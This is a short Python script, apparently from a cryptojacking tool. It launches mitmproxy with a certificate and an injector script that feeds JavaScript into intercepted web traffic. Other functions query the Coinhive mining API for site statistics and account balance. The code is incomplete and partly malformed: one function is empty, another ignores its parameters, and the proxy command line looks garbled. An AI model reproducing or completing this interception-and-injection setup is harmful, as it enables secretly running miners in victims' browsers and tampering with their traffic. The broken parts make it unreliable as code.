#!/usr/bin/env python3
from OpenSSL import crypto
import json
import requests
import os

def start_mitm():
    pass
    
def get_cert(path, basename):
    os.system("~/.local/bin/mitmproxy -p 8080 -s 'cert *=run/src/cert/cert.pem' 'controllers/injector.py controllers/js/script.js' -T")
    pass

def get_stats(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    return requests.get("https://api.coinhive.com/stats/site", params=params, headers=headers).json()

def get_balance(secret_key, params={}):
    headers = {
        "User-Agent": "bytexmen@mail.com",
        "Content-Type": "application/json"
    }
    params.update(secret=secret_key)
    params.update(name="bytexmen@mail.com")
    return requests.get("https://api.coinhive.com/user/balance", params=params, headers=headers).json()
